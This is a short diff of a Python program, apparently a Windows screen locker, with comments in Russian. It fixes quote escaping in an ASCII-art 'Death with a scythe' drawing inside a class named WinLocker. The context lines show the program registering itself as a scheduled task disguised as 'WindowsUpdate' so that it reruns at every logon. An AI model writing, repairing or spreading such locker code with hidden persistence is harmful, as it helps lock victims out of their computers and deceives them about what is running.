@@ -29,7 +29,6 @@ def add_to_startup():
     import subprocess
     script_path = os.path.abspath(__file__)
     command = f'python "{script_path}"'
-    # Создаём задание в планировщике
     subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{command}" /sc onlogon /f', shell=True, capture_output=True)
 
 # === ОТКРЫВАЕМ ВИДЕО ВК В БРАУЗЕРЕ ===
@@ -98,13 +97,14 @@ class WinLocker:
     def draw_reaper(self, x, y, frame):
         """Рисует ASCII Смерть с косой"""
         import math
+        # Заменил двойные кавычки на одинарные, чтобы не было ошибки
         lines = [
-            "     .-"-.",
-            "    /|6 6|\\",
-            "   {/(_0_)\\}",
-            "    _/ ^ \\_",
-            "   (/ /^\\ \\)-'",
-            "    \"\"' '\"\""
+            '     .-"-.\'',
+            '    /|6 6|\\',
+            '   {/(_0_)\\}',
+            '    _/ ^ \\_',
+            '   (/ /^\\ \\)-',
+            '     ""\' \'""'
         ]
         angle = frame * 0.1
         end_x = x + int(40 * math.cos(angle))
